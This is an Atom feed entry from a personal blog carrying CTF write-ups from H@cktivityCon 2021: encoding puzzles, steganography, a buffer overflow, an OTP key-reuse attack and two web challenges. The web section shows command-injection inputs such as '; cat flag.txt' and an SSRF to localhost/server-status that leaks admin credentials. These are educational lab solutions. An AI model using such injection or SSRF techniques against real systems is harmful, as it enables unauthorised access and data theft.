<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://bernardsmith0892.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://bernardsmith0892.github.io/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2021-09-20T00:14:54-10:00</updated><id>https://bernardsmith0892.github.io/feed.xml</id><title type="html">Bernard Smith</title><subtitle>Mostly technology-related</subtitle><entry><title type="html">H@cktivityCon 2021 CTF Writeups</title><link href="https://bernardsmith0892.github.io/posts/Hacktivity2021/" rel="alternate" type="text/html" title="H@cktivityCon 2021 CTF Writeups" /><published>2021-09-19T18:01:00-10:00</published><updated>2021-09-19T18:01:00-10:00</updated><id>https://bernardsmith0892.github.io/posts/Hacktivity2021</id><content type="html" xml:base="https://bernardsmith0892.github.io/posts/Hacktivity2021/">&lt;p&gt;Had a lot of fun with this CTF and it’s always nice to see my amateur radio and infosec hobbies mixing together. Actually got around to doing a writeup this year too! I sometimes wonder if I should ever try joining a team for one of these, instead of always competing as a “solo” team. Maybe I’d do better than hovering around top 10% every time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/certificate.png&quot; alt=&quot;Certificate&quot; title=&quot;Certificate&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;warmups&quot;&gt;Warmups&lt;/h1&gt;

&lt;h2 id=&quot;six-four-over-two-50-points&quot;&gt;Six Four Over Two (50 points)&lt;/h2&gt;
&lt;p&gt;We are provided with a short text file containing the string: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EBTGYYLHPNQTINLEGRSTOMDCMZRTIMBXGY2DKMJYGVSGIOJRGE2GMOLDGBSWM7IK&lt;/code&gt;. Based on the name of the challenge, this could potentially be a &lt;em&gt;Base32-encoded&lt;/em&gt; string. (Because \(\frac{64}{2} = 32\)) We test our theory using &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)&amp;amp;input=RUJUR1lZTEhQTlFUSU5MRUdSU1RPTURDTVpSVElNQlhHWTJES01KWUdWU0dJT0pSR0UyR01PTERHQlNXTTdJSw&quot;&gt;CyberChef&lt;/a&gt; and immediately get the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{a45d4e70bfc407645185dd9114f9c0ef}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;bass64-50-points&quot;&gt;Bass64 (50 points)&lt;/h2&gt;
&lt;p&gt;We are provided with another text file, this time containing what appears to be a garbled mess of lines. However, simply disabling &lt;em&gt;word wrap&lt;/em&gt; in Notepad allows us to see that it’s just ASCII word art for the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IGZsYWd7MzVhNWQxM2RhNmEyYWZhMGM2MmJmY2JkZDYzMDFhMGF9&lt;/code&gt;. Because it’s a relatively short string and I don’t know of anything that can convert from ASCII art back to text, we just manually parse and copy the text.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt; ___ ____ _____  __   ____        __  _ _____ __  __    __     ___     _   _ __        _____        __  __ ____  ____  _     _   _           _____      __   ____        ________     __  __  ____ __  __ ____  __  __               _         __   ______     _ _     ____ _______   __   __  __ ____  _____ _      __  __  ____ _____ ___  
|_ _/ ___|__  /__\ \ / /\ \      / /_| |___  |  \/  |___\ \   / / |__ | \ | |\ \      / / _ \ __  _|  \/  |___ \|  _ \| |__ | \ | |_ __ ___ | ____|   _ \ \ / /\ \      / /__  / |__ |  \/  |/ ___|  \/  |___ \|  \/  |_ __ ___     | | _ __ __\ \ / /___ \   | | | __|__  /|  _ \ \ / /__|  \/  |  _ \|  ___| |__  |  \/  |/ ___|  ___/ _ \ 
 | | |  _  / // __\ V /  \ \ /\ / / _` |  / /| |\/| |_  /\ \ / /| '_ \|  \| | \ \ /\ / / | | |\ \/ / |\/| | __) | |_) | '_ \|  \| | '_ ` _ \|  _|| | | | \ V /  \ \ /\ / /  / /| '_ \| |\/| | |  _| |\/| | __) | |\/| | '_ ` _ \ _  | || '_ ` _ \ V /  __) |  | | |/ /  / / | | | \ V /_  / |\/| | | | | |_  | '_ \ | |\/| | |  _| |_ | (_) |
 | | |_| |/ /_\__ \| |    \ V  V / (_| | / / | |  | |/ /  \ V / | | | | |\  |  \ V  V /| |_| | &amp;gt;  &amp;lt;| |  | |/ __/|  _ &amp;lt;| | | | |\  | | | | | | |__| |_| |  | |    \ V  V /  / /_| | | | |  | | |_| | |  | |/ __/| |  | | | | | | | |_| || | | | | | |  / __/ |_| |   &amp;lt;  / /_ | |_| || | / /| |  | | |_| |  _| | | | || |  | | |_| |  _| \__, |
|___\____/____|___/|_|     \_/\_/ \__,_|/_/  |_|  |_/___|  \_/  |_| |_|_| \_|   \_/\_/  \__\_\/_/\_\_|  |_|_____|_| \_\_| |_|_| \_|_| |_| |_|_____\__, |  |_|     \_/\_/  /____|_| |_|_|  |_|\____|_|  |_|_____|_|  |_|_| |_| |_|\___/ |_| |_| |_|_| |_____\___/|_|\_\/____ |____/ |_|/___|_|  |_|____/|_|   |_| |_||_|  |_|\____|_|     /_/ 
                                                                                                                                                  |___/                                                                                                                                                                                      
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Based on both the challenge name and the format of the string, we can assume that this is a &lt;em&gt;Base64-encoded&lt;/em&gt; string. Putting this into &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&amp;amp;input=SUdac1lXZDdNelZoTldReE0yUmhObUV5WVdaaE1HTTJNbUptWTJKa1pEWXpNREZoTUdGOQ&quot;&gt;CyberChef&lt;/a&gt; gives us the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{35a5d13da6a2afa0c62bfcbdd6301a0a}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;pimple-50-points&quot;&gt;Pimple (50 points)&lt;/h2&gt;
&lt;p&gt;This one is pretty simple. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; on attachment shows that it’s a &lt;em&gt;GIMP&lt;/em&gt; file. Then after opening the file in &lt;em&gt;GIMP&lt;/em&gt; and looking through the content, we find the flag printed on one of the inner layers: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{9a64bc4a390cb0ce31452820ee562c3f}&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;$ file pimple
pimple: GIMP XCF image data, version 011, 1024 x 1024, RGB Color
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/pimple.png&quot; alt=&quot;File opened in GIMP&quot; title=&quot;Opened in GIMP&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tsunami-50-points&quot;&gt;Tsunami (50 points)&lt;/h2&gt;
&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; again, we discover that this is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.wav&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;$ file tsunami
tsunami: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The end of the audio is a series of tones that makes me think it’s &lt;em&gt;spectrogram steganography&lt;/em&gt;. After finding a website that let’s us view the spectrogram of an audio file(&lt;a href=&quot;https://academo.org/demos/spectrum-analyzer/&quot;&gt;Academo&lt;/a&gt;), we see that those series of tones make up the flag value: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{f8fbb2c761821d3af23859f721cc140b}&lt;/code&gt;. If it’s hard to make out the flag yourself, just remember that all of the letters are lowercase so they can’t be confused with a number.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/tsunami.png&quot; alt=&quot;tsunami.wav Spectrogram&quot; title=&quot;tsunami.wav Spectrogram&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;butter-overflow-50-points&quot;&gt;Butter Overflow (50 points)&lt;/h2&gt;
&lt;p&gt;This time we’re provided with three files.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An executable file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;butter_overflow&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;The source code of the executable: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source.c&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Makefile&lt;/code&gt; we can use to compile the source code ourselves&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After examining the source code, we discover the following information about the program’s behavior:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Line 43 - Creates a buffer array that can store up to 512 bytes&lt;/li&gt;
  &lt;li&gt;Line 51 - Directly saves user input into this buffer, without size checks&lt;/li&gt;
  &lt;li&gt;Lines 48 &amp;amp; 10 - Runs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;give_flag()&lt;/code&gt; function if there’s a &lt;em&gt;segmentation fault&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So the solution is simple, if we provide enough input to the program to cause a &lt;em&gt;buffer overflow&lt;/em&gt;, it’ll trigger a segmentation fault and give us the flag. Sure enough, sending &lt;em&gt;600 A’s&lt;/em&gt; to the challenge server prints out the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{72d8784a5da3a8f56d2106c12dbab989}&lt;/code&gt;&lt;/p&gt;

&lt;script id=&quot;asciicast-1jvQPqbLREpu1hOBmBH0AaVpV&quot; src=&quot;https://asciinema.org/a/1jvQPqbLREpu1hOBmBH0AaVpV.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

&lt;h2 id=&quot;oddball-103-points&quot;&gt;Oddball (103 points)&lt;/h2&gt;
&lt;p&gt;Funnily enough, this warmup challenge ended up being worth more than some of the “real” challenges. Here, we are given an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oddball&lt;/code&gt; file containing several lines of numbers.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;0000000 067531 020165 067165 067543 062566 062562 020144 064164
0000020 020145 062563 071143 072145 066440 071545 060563 062547
0000040 035440 005051 072516 061155 071145 020163 067151 071040
0000060 067141 062547 030040 033455 020077 066510 066555 020041
0000100 067510 020167 062157 005041 063012 060554 075547 060462
0000120 031065 061462 033062 034143 060467 031546 034461 061062
0000140 031064 031543 063064 031544 033062 034063 061065 005175
0000160
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After analyzing the file for a bit, we realize that there are no numbers greater than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7&lt;/code&gt;, so the file must be a list of &lt;em&gt;octal&lt;/em&gt; numbers. As it turns out, the famous &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt; tool has a lesser known uncle called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;od&lt;/code&gt;. But rather than hexdumps, this program creates &lt;em&gt;octal dumps&lt;/em&gt; of files in the exact same format as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oddball&lt;/code&gt; file. Unfortunately, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;od&lt;/code&gt; doesn’t appear to have a reversal function like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt; does, so we have to make one ourselves. After taking out the first column of numbers, we can use the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt; script to decode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;oddball&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;oct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;067531 020165 067165 067543 062566 062562 020144 064164 020145 062563 071143 072145
066440 071545 060563 062547 035440 005051 072516 061155 071145 020163 067151 071040 067141
062547 030040 033455 020077 066510 066555 020041 067510 020167 062157 005041 063012 060554
075547 060462 031065 061462 033062 034143 060467 031546 034461 061062 031064 031543 063064
031544 033062 034063 061065 005175&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;oct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# Decodes the octal string into its byte form
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# ^──────────────┐
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# Reverses the endianess of the byte so it prints correctly
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# ^────┐         |
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# Decodes the byte into a printable string
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# ^────|─────────|───────┐
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#      V         V       V
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running this script provides us with the following output containing the flag:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;You uncovered the secret message ;)
Numbers in range 0-7? Hmmm! How od!

flag{2a522c26c87af3192b42c34fd326385b}
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;web&quot;&gt;Web&lt;/h1&gt;

&lt;h2 id=&quot;confidentiality-50-points&quot;&gt;Confidentiality (50 points)&lt;/h2&gt;
&lt;p&gt;This challenge involves a simple command injection vulnerability. We’re provided with a web application that gives us the ability to check the access control settings for any given file on the server. To start, we test it out with a known file, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/confidentiality_1.png&quot; alt=&quot;Testing /etc/passwd&quot; title=&quot;Testing with /etc/passwd&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These results seem eerily similar to what &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; does. It appears that the application is simply taking our input and appending it to an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; command. So if we wanted to see the files in our current directory, we could provide it with a period (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;). Of course, we would normally just run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; on its own for the same effect, but the application rejects an empty input.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/confidentiality_2.png&quot; alt=&quot;Testing .&quot; title=&quot;Testing with .&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is the exact output we would expect from an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l .&lt;/code&gt; command. So our goal now is to output the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; file within this directory. To verify our command injection capabilities, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; character to append a second command to this line. By sending a request for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; whoami&lt;/code&gt;, we predict that the server will run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l ; whoami&lt;/code&gt;, showing us the current directory and username.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/confidentiality_3.png&quot; alt=&quot;Testing whoami&quot; title=&quot;Testing with whoami&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Success! This shows us that we have the ability to execute commands on the server. Now we just need to send a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat flag.txt&lt;/code&gt; request to output the flag, which ends up being: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{e56abbce7b83d62dac05e59fb1e81c68}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/confidentiality_flag.png&quot; alt=&quot;Retrieving flag.txt&quot; title=&quot;Retrieving the flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Bonus&lt;/strong&gt;: If we wanted to, we can also see the source code for the application itself. A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat main.py&lt;/code&gt; request outputs the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.py&lt;/code&gt; and shows how the application operates. And exactly how we predicted, the application is simply appending our input to the end of an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; command, without any verification or sanitization.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/confidentiality_mainpy.png&quot; alt=&quot;Server source code&quot; title=&quot;Retrieving the server's source code&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;titanic-50-points&quot;&gt;Titanic (50 points)&lt;/h2&gt;
&lt;p&gt;This challenge involves leveraging a &lt;em&gt;server-side request forgery (SSRF)&lt;/em&gt; to access sensitive, internal information. The website contains two main features that we will use: an admin login page and a URL capturer service.&lt;/p&gt;

&lt;p&gt;The admin login is fairly normal. Since we obviously don’t have any admin credentials, we cannot make real use of this section right now. However, one thing of note about this page is the unique way it sends login attempts. Normally, logins would be sent as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request, with the username and password in the body. But here, the login attempt is made as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; request, with the username and password in the URL. A username and password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test:test&lt;/code&gt; is performed with the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://challenge.ctf.games:31971/admin.php?uname=test&amp;amp;psw=test&lt;/code&gt;. While this behavior isn’t particularly useful to us right now, it will become very important later on.&lt;/p&gt;

&lt;p&gt;Moving on to the URL capturer service. This service simply takes the URL we provide, makes a request to that URL on our behalf, and gives back a screenshot of the webpage. This service can allow us to perform an &lt;em&gt;SSRF&lt;/em&gt; to disclose sensitive, local information on the server. It’s actually difficult to really call it an &lt;em&gt;SSRF&lt;/em&gt; vulnerability because it’s clearly intended behavior. But to first validate that we &lt;strong&gt;can&lt;/strong&gt; use it for &lt;em&gt;SSRF&lt;/em&gt;, we will make a request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost&lt;/code&gt; and verify that we receive the same webpage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/titanic_1.png&quot; alt=&quot;Requesting localhost&quot; title=&quot;SSRF request to localhost&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The request is successful! We receive back the loading circle for the website, showing that it is successfully making a request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost&lt;/code&gt;. As far as how to use it though, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file for the website points to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/server-status&lt;/code&gt; page as an option. When we make a request to that page ourselves, it gives back a &lt;em&gt;403 Forbidden&lt;/em&gt; error. However, if we ask the server to request it locally at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/server-status&lt;/code&gt;, we get back the full status page for this webserver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/titanic_2.png&quot; alt=&quot;Server-status&quot; title=&quot;Server-status page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Remember how login attempts are made as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; request? Because of that, now we can clearly see a username and password for a previously successful login attempt: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:EYNDR4NhadwX9rtef&lt;/code&gt;. Using these credentials, we can access the admin page and retrieve the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{88269d5ef52a5ee961ea6449e1b610a9}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/titanic_3.png&quot; alt=&quot;Admin page&quot; title=&quot;Admin page&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;cryptography&quot;&gt;Cryptography&lt;/h1&gt;

&lt;h2 id=&quot;n1tp-50-points&quot;&gt;N1TP (50 Points)&lt;/h2&gt;
&lt;p&gt;This challenge is deceptively simple. When we first connect to the server, &lt;em&gt;“Nina”&lt;/em&gt; provides us with the ciphertext of the flag. We should also note that the ciphertext changes between connections. After this, they give us the option to provide our own plaintext to see the resulting ciphertext. While providing the ciphertext, Nina also confirms that we’re dealing with a &lt;em&gt;one-time pad (OTP)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Nina is correct in saying that &lt;em&gt;OTPs&lt;/em&gt; are unbreakable. However, this is with the giant caveat that the &lt;em&gt;OTP&lt;/em&gt; is used correctly. If you were to ever &lt;em&gt;reuse&lt;/em&gt; a OTP’s key, like what Nina is doing here, it gives an attacker an opportunity to break the encryption. Even worse, if you reuse the key on plaintext that the attacker &lt;em&gt;already knows&lt;/em&gt;, that OTP is completely broken.&lt;/p&gt;

&lt;p&gt;The reason for this is that a OTP uses the &lt;em&gt;exclusive OR (XOR)&lt;/em&gt; operation to perform its encryption and decryption. Normal use of an XOR (\(\oplus\)) cipher goes like this:&lt;/p&gt;

\[\textbf{Encryption: } \text{Plaintext} \oplus \text{Key} = \text{Ciphertext}\]

\[\textbf{Decryption: } \text{Ciphertext} \oplus \text{Key} = \text{Plaintext}\]

&lt;p&gt;However, we if know the plaintext &lt;strong&gt;and&lt;/strong&gt; ciphertext of a message, we can also compute the &lt;em&gt;key&lt;/em&gt; using the properties of the XOR operation.&lt;/p&gt;

\[\text{Plaintext} \oplus \text{Ciphertext} = \text{Key}\]

&lt;p&gt;So using this principle, we can perform a &lt;em&gt;known-plaintext attack&lt;/em&gt; on Nina’s OTP to derive the key. Our first step is to encrypt a plaintext value the same length of the flag. For this, we will choose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00000000000000000000000000000000000000&lt;/code&gt;.&lt;/p&gt;

&lt;script id=&quot;asciicast-NlpJ9KNEGz41BSF4oR4FSfbAb&quot; src=&quot;https://asciinema.org/a/NlpJ9KNEGz41BSF4oR4FSfbAb.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

&lt;p&gt;After receiving back the ciphertext for this message, we can &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Hex','string':'a83b924150fb13d960690a8163c38c2b9047b75642d7ad16ddcb47c15ad1f1704977d1edbddb%20%20%20%20'%7D,'Standard',false)To_Hex('None',0)&amp;amp;input=MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA&quot;&gt;XOR the plaintext and ciphertext together&lt;/a&gt; to determine the OTP key using CyberChef. Finally, we can &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Hex('None')XOR(%7B'option':'Hex','string':'980ba27160cb23e950593ab153f3bc1ba077876672e79d26edfb77f16ae1c1407947e1dd8deb'%7D,'Standard',false)&amp;amp;input=ZmU2N2MzMTYxYmYyMTFkZTY2M2E1ZWQzNjRjNWRkMjhjNDEzYjEwNDQzODFhODE0ZGVjOTQ3YzgwOTg1ZjgyMzQ5MjZkMGVjZWY5Ng&quot;&gt;XOR the flag’s ciphertext and the key together&lt;/a&gt; to reveal the flag in plaintext: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag{9276cdb76a3dd6b1f523209cd9c0a11b}&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;miscellanious&quot;&gt;Miscellanious&lt;/h1&gt;

&lt;h2 id=&quot;bad-words-50-points&quot;&gt;Bad Words (50 points)&lt;/h2&gt;
